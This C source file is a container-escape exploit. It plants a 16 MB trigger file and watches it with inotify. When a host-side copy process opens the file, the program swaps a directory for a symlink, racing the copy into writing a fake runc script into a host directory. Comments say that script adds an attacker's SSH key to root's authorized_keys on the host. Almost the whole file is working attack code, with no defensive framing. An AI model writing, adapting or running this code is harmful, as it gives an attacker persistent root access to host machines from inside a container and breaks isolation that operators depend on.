#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

/* ── config key names (must match payload_scripts.txt) ───────────────────── */
#define KEY_VISIBLE_FILE     "VISIBLE_FILE"
#define KEY_BACKING_FILE     "BACKING_FILE"
#define KEY_TRIGGER_FILE     "TRIGGER_FILE"
#define KEY_PIVOT_DIR        "PIVOT_DIR"
#define KEY_STAGE_LINK       "STAGE_LINK"
#define KEY_BACKUP_DIR       "BACKUP_DIR"
#define KEY_HOST_TARGET_DIR  "HOST_TARGET_DIR"
#define KEY_HOST_TARGET_FILE "HOST_TARGET_FILE"
#define KEY_EXIT_QUIET_MS    "EXIT_QUIET_MS"
#define KEY_SSH_KEY          "SSH_KEY"

#define CONFIG_FILE "/app/pluginmanager/plugins/escape_script/payload_scripts.txt"
#define MAX_VAL     2048
#define MAX_LINE    4096

/* ── config struct ───────────────────────────────────────────────────────── */
typedef struct {
    char visible_file    [MAX_VAL];
    char backing_file    [MAX_VAL];
    char trigger_file    [MAX_VAL];
    char pivot_dir       [MAX_VAL];
    char stage_link      [MAX_VAL];
    char backup_dir      [MAX_VAL];
    char host_target_dir [MAX_VAL];
    char host_target_file[MAX_VAL];
    char ssh_key         [MAX_VAL];
    int  exit_quiet_ms;
} Config;

static Config cfg;

/* ── helpers ─────────────────────────────────────────────────────────────── */

static void die(const char *what)
{
    perror(what);
    exit(1);
}

/* Trim leading and trailing whitespace in-place. */
static char *trim(char *s)
{
    char *end;

    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n') s++;
    if (*s == '\0') return s;

    end = s + strlen(s) - 1;
    while (end > s && (*end == ' ' || *end == '\t' ||
                        *end == '\r' || *end == '\n')) end--;
    end[1] = '\0';
    return s;
}

/* ── config parser ───────────────────────────────────────────────────────── */

/*
 * Reads payload_scripts.txt.
 * Format: KEY=VALUE  (one per line, # for comments, blank lines ignored)
 * Values may contain spaces — only the first '=' is treated as separator.
 */
static void load_config(const char *path)
{
    FILE *f = fopen(path, "r");
    char  line[MAX_LINE];
    int   lineno = 0;

    if (!f) {
        fprintf(stderr, "ERROR: cannot open config file '%s': %s\n",
                path, strerror(errno));
        exit(1);
    }

    /* set safe defaults */
    cfg.exit_quiet_ms = 250;

    while (fgets(line, sizeof(line), f)) {
        char *key, *val, *eq;

        lineno++;
        key = trim(line);

        /* skip blank lines and comments */
        if (*key == '\0' || *key == '#') continue;

        eq = strchr(key, '=');
        if (!eq) {
            fprintf(stderr, "WARN: line %d: no '=' found, skipping: %s\n",
                    lineno, key);
            continue;
        }

        /* split at first '=' */
        *eq = '\0';
        val = trim(eq + 1);
        key = trim(key);

        /* match against known keys */
        if      (strcmp(key, KEY_VISIBLE_FILE    ) == 0)
            snprintf(cfg.visible_file,     MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_BACKING_FILE    ) == 0)
            snprintf(cfg.backing_file,     MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_TRIGGER_FILE    ) == 0)
            snprintf(cfg.trigger_file,     MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_PIVOT_DIR       ) == 0)
            snprintf(cfg.pivot_dir,        MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_STAGE_LINK      ) == 0)
            snprintf(cfg.stage_link,       MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_BACKUP_DIR      ) == 0)
            snprintf(cfg.backup_dir,       MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_HOST_TARGET_DIR ) == 0)
            snprintf(cfg.host_target_dir,  MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_HOST_TARGET_FILE) == 0)
            snprintf(cfg.host_target_file, MAX_VAL, "%s", val);
        else if (strcmp(key, KEY_EXIT_QUIET_MS   ) == 0)
            cfg.exit_quiet_ms = atoi(val);
        else if (strcmp(key, KEY_SSH_KEY         ) == 0)
            snprintf(cfg.ssh_key,          MAX_VAL, "%s", val);
        else
            fprintf(stderr, "WARN: line %d: unknown key '%s'\n", lineno, key);
    }

    fclose(f);

    /* validate required fields */
    #define REQUIRE(field, name) \
        if (cfg.field[0] == '\0') { \
            fprintf(stderr, "ERROR: required key '%s' missing from %s\n", \
                    name, path); \
            exit(1); \
        }

    REQUIRE(visible_file,     KEY_VISIBLE_FILE    )
    REQUIRE(backing_file,     KEY_BACKING_FILE    )
    REQUIRE(trigger_file,     KEY_TRIGGER_FILE    )
    REQUIRE(pivot_dir,        KEY_PIVOT_DIR       )
    REQUIRE(stage_link,       KEY_STAGE_LINK      )
    REQUIRE(backup_dir,       KEY_BACKUP_DIR      )
    REQUIRE(host_target_dir,  KEY_HOST_TARGET_DIR )
    REQUIRE(host_target_file, KEY_HOST_TARGET_FILE)
    REQUIRE(ssh_key,          KEY_SSH_KEY         )

    #undef REQUIRE

    printf("[config] loaded from %s\n",         path);
    printf("[config] visible_file     = %s\n",  cfg.visible_file);
    printf("[config] backing_file     = %s\n",  cfg.backing_file);
    printf("[config] trigger_file     = %s\n",  cfg.trigger_file);
    printf("[config] pivot_dir        = %s\n",  cfg.pivot_dir);
    printf("[config] stage_link       = %s\n",  cfg.stage_link);
    printf("[config] backup_dir       = %s\n",  cfg.backup_dir);
    printf("[config] host_target_dir  = %s\n",  cfg.host_target_dir);
    printf("[config] host_target_file = %s\n",  cfg.host_target_file);
    printf("[config] exit_quiet_ms    = %d\n",  cfg.exit_quiet_ms);
    printf("[config] ssh_key          = %s\n",  cfg.ssh_key);
    fflush(stdout);
}

/* ── monotonic clock ─────────────────────────────────────────────────────── */

static uint64_t monotonic_ms(void)
{
    struct timespec ts;

    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) die("clock_gettime");
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

/* ── filesystem helpers ──────────────────────────────────────────────────── */

static void mkdir_p(const char *path, mode_t mode)
{
    char  tmp[PATH_MAX];
    char *p;

    if (snprintf(tmp, sizeof(tmp), "%s", path) >= (int)sizeof(tmp)) {
        fprintf(stderr, "mkdir path too long: %s\n", path);
        exit(1);
    }
    for (p = tmp + 1; *p != '\0'; p++) {
        if (*p != '/') continue;
        *p = '\0';
        if (mkdir(tmp, mode) != 0 && errno != EEXIST) die("mkdir");
        *p = '/';
    }
    if (mkdir(tmp, mode) != 0 && errno != EEXIST) die("mkdir");
}

static void write_text_file(const char *path, const char *text)
{
    size_t   len     = strlen(text);
    ssize_t  written;
    int      fd      = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    if (fd < 0) die(path);
    written = write(fd, text, len);
    if (written < 0 || (size_t)written != len) { close(fd); die("write"); }
    if (close(fd) != 0) die("close");
}

static void write_repeat_file(const char *path, char fill, size_t size)
{
    static char buf[64 * 1024];
    size_t remaining = size;
    int    fd;

    memset(buf, fill, sizeof(buf));
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) die(path);

    while (remaining > 0) {
        size_t  chunk   = remaining < sizeof(buf) ? remaining : sizeof(buf);
        ssize_t written = write(fd, buf, chunk);
        if (written < 0 || (size_t)written != chunk) { close(fd); die("write"); }
        remaining -= chunk;
    }
    if (close(fd) != 0) die("close");
}

/* ── exploit stages ──────────────────────────────────────────────────────── */

/*
 * Recursively removes a directory and all its contents.
 * Used to clean up stale pivot/backup dirs from a previous run.
 * Only removes directories — does not follow symlinks outside the tree.
 */
static void rmdir_recursive(const char *path)
{
    char cmd[PATH_MAX * 2];

    /* Use /bin/rm -rf — acceptable here because we control the paths
     * and this runs inside the attacker's container, not the host. */
    if (snprintf(cmd, sizeof(cmd), "/bin/rm -rf '%s'", path) >= (int)sizeof(cmd)) {
        fprintf(stderr, "WARN: path too long to remove: %s\n", path);
        return;
    }
    if (system(cmd) != 0) {
        fprintf(stderr, "WARN: failed to remove %s\n", path);
    }
}

/*
 * Removes all stale filesystem state from a previous run so that
 * setup_layout() can recreate everything cleanly.
 *
 * Handles:
 *   - stage_link  : symlink — unlink() removes it regardless of target
 *   - backup_dir  : leftover from a previous successful pivot — rmdir
 *   - pivot_dir   : leftover if previous run was interrupted — rmdir
 *   - trigger_file: overwritten by write_repeat_file (O_TRUNC) — no action
 *   - backing_file: overwritten by write_text_file (O_TRUNC) — no action
 */
static void cleanup_layout(void)
{
    struct stat st;

    /* ── NEW: if visible_file exists as a regular file, remove it
     * so mkdir_p can create it as a directory ─────────────────────────── */
    if (lstat(cfg.visible_file, &st) == 0) {
        if (S_ISREG(st.st_mode)) {
            /* it's a regular file — remove it so we can mkdir */
            if (unlink(cfg.visible_file) != 0) {
                fprintf(stderr,
                    "ERROR: cannot remove existing file at visible_file "
                    "'%s': %s\n",
                    cfg.visible_file, strerror(errno));
                exit(1);
            }
            printf("[cleanup] removed regular file: %s "
                   "(will be replaced with directory)\n",
                   cfg.visible_file);

        } else if (S_ISDIR(st.st_mode)) {
            /* already a directory — leave it, mkdir_p handles exist */
            printf("[cleanup] visible_file already a directory: %s\n",
                   cfg.visible_file);
        }
    }

    /* stage_link */
    if (lstat(cfg.stage_link, &st) == 0) {
        if (unlink(cfg.stage_link) != 0) {
            fprintf(stderr, "WARN: could not remove stage_link %s: %s\n",
                    cfg.stage_link, strerror(errno));
        } else {
            printf("[cleanup] removed stage_link: %s\n", cfg.stage_link);
        }
    }

    /* backup_dir */
    if (lstat(cfg.backup_dir, &st) == 0) {
        if (S_ISDIR(st.st_mode)) {
            rmdir_recursive(cfg.backup_dir);
            printf("[cleanup] removed backup_dir: %s\n", cfg.backup_dir);
        } else {
            unlink(cfg.backup_dir);
            printf("[cleanup] removed stale file at backup_dir: %s\n",
                   cfg.backup_dir);
        }
    }

    /* pivot_dir */
    if (lstat(cfg.pivot_dir, &st) == 0) {
        if (S_ISDIR(st.st_mode)) {
            rmdir_recursive(cfg.pivot_dir);
            printf("[cleanup] removed pivot_dir: %s\n", cfg.pivot_dir);
        } else {
            unlink(cfg.pivot_dir);
            printf("[cleanup] removed stale file at pivot_dir: %s\n",
                   cfg.pivot_dir);
        }
    }

    fflush(stdout);
}
/*
 * Builds the fake runc script from the SSH key read from config.
 * The script appends the attacker's public key to /root/.ssh/authorized_keys
 * then removes itself and restores the real runc — called once by the
 * host kernel when Docker next spawns a container after the race wins.
 */
static void build_fake_runc(char *out, size_t outlen)
{
    snprintf(out, outlen,
        "%s",
        cfg.ssh_key);
}

static void setup_layout(void)
{
    char fake_runc[MAX_VAL * 2];

    /* Remove stale state from any previous run before recreating.
     * write_text_file and write_repeat_file use O_TRUNC so they
     * overwrite existing files automatically — only dirs and the
     * symlink need explicit cleanup. */
    cleanup_layout();

    mkdir_p(cfg.pivot_dir,        0755);
    mkdir_p(cfg.host_target_dir,  0755);

    /* backing_file and trigger_file use O_TRUNC — safe to call even
     * if the files already exist from a previous run */
    write_text_file(cfg.backing_file, "top-level file\n");
    write_repeat_file(cfg.trigger_file, 'B', 16 * 1024 * 1024);

    build_fake_runc(fake_runc, sizeof(fake_runc));
    write_text_file(cfg.host_target_file, fake_runc);

    if (chmod(cfg.host_target_file, 0755) != 0) die("chmod");

    /* symlink — stage_link was removed by cleanup_layout so this
     * will always succeed on a clean slate */
    if (symlink(cfg.host_target_dir, cfg.stage_link) != 0) die("symlink");

    printf("[setup] layout ready\n");
    fflush(stdout);
}

static bool try_pivot(void)
{
    if (rename(cfg.pivot_dir,   cfg.backup_dir) != 0) {
        perror("rename escape -> backup");
        return false;
    }
    if (rename(cfg.stage_link, cfg.pivot_dir) != 0) {
        perror("rename staged symlink -> escape");
        return false;
    }
    printf("[pivot] %s -> %s\n", cfg.pivot_dir, cfg.host_target_dir);
    fflush(stdout);
    return true;
}

/* ── inotify monitor loop ────────────────────────────────────────────────── */

static void run_monitor(void)
{
    char     buf[4096];
    bool     raced           = false;
    uint64_t exit_deadline   = 0;
    int      fd              = inotify_init1(IN_CLOEXEC);
    struct   pollfd pfd      = { .fd = fd, .events = POLLIN };

    /* basename of trigger_file — what inotify reports in event->name */
    const char *trigger_name = strrchr(cfg.trigger_file, '/');
    trigger_name = trigger_name ? trigger_name + 1 : cfg.trigger_file;

    if (fd < 0) die("inotify_init1");

    if (inotify_add_watch(fd, cfg.visible_file,
                          IN_OPEN | IN_ACCESS | IN_ONLYDIR) < 0)
        die("inotify_add_watch (visible_file)");

    if (inotify_add_watch(fd, cfg.host_target_dir,
                          IN_OPEN | IN_ACCESS |
                          IN_CLOSE_NOWRITE | IN_CLOSE_WRITE) < 0)
        die("inotify_add_watch (host_target_dir)");

    printf("[monitor] watching %s and %s\n",
           cfg.visible_file, cfg.host_target_dir);
    fflush(stdout);

    for (;;) {
        int     timeout = -1;
        ssize_t len;
        char   *ptr;

        if (raced) {
            uint64_t now = monotonic_ms();
            if (now >= exit_deadline) {
                printf("[monitor] copy activity quiet — exiting\n");
                fflush(stdout);
                return;
            }
            timeout = (int)(exit_deadline - now);
        }

        if (poll(&pfd, 1, timeout) < 0) {
            if (errno == EINTR) continue;
            die("poll");
        }

        if ((pfd.revents & POLLIN) == 0) {
            if (raced) {
                printf("[monitor] copy activity quiet — exiting\n");
                fflush(stdout);
                return;
            }
            continue;
        }

        len = read(fd, buf, sizeof(buf));
        if (len < 0) {
            if (errno == EINTR) continue;
            die("read");
        }
        ptr = buf;

        while (ptr < buf + len) {
            struct inotify_event *ev = (struct inotify_event *)ptr;

            if (!raced &&
                (ev->mask & (IN_OPEN | IN_ACCESS)) != 0 &&
                ev->len > 0 &&
                strcmp(ev->name, trigger_name) == 0) {

                raced = try_pivot();
                if (raced)
                    exit_deadline = monotonic_ms() +
                                    (uint64_t)cfg.exit_quiet_ms;

            } else if (raced) {
                exit_deadline = monotonic_ms() +
                                (uint64_t)cfg.exit_quiet_ms;
            }

            ptr += sizeof(*ev) + ev->len;
        }
    }
}

/* ── entry point ─────────────────────────────────────────────────────────── */

int main(void)
{
    load_config(CONFIG_FILE);
    setup_layout();
    run_monitor();
    return 0;
}